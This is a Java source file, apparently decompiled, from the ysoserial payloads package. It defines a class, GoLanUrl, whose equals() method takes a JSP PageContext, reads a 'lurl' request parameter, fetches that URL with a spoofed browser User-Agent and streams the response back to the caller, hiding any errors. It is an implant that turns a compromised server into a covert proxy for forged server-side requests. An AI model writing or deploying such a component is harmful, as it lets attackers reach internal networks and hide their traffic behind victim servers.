package ysoserial.payloads.util;

import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;

public class GoLanUrl {
   public GoLanUrl() {
   }

   public boolean equals(Object var1) {
      if (var1 instanceof PageContext) {
         ServletOutputStream var2 = null;

         try {
            PageContext var3 = (PageContext)var1;
            URL var4 = new URL(var3.getRequest().getParameter("lurl"));
            var2 = ((HttpServletResponse)var3.getResponse()).getOutputStream();
            URLConnection var5 = var4.openConnection();
            var5.setRequestProperty("Connection", "close");
            var5.setRequestProperty("Accept-Charset", "utf-8");
            var5.setRequestProperty("contentType", "utf-8");
            var5.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36");
            var5.setDefaultUseCaches(false);
            var5.setConnectTimeout(600000);
            var5.setDoInput(true);
            var5.setDoOutput(true);
            var5.getOutputStream().close();
            InputStream var6 = var5.getInputStream();
            short var7 = 8192;
            byte[] var9 = new byte[var7];

            int var8;
            while(-1 < (var8 = var6.read(var9, 0, var7))) {
               var2.write(var9, 0, var8);
            }

            var6.close();
         } catch (Exception var18) {
         } finally {
            if (var2 != null) {
               try {
                  var2.close();
               } catch (Exception var17) {
               }
            }

         }
      }

      return true;
   }
}
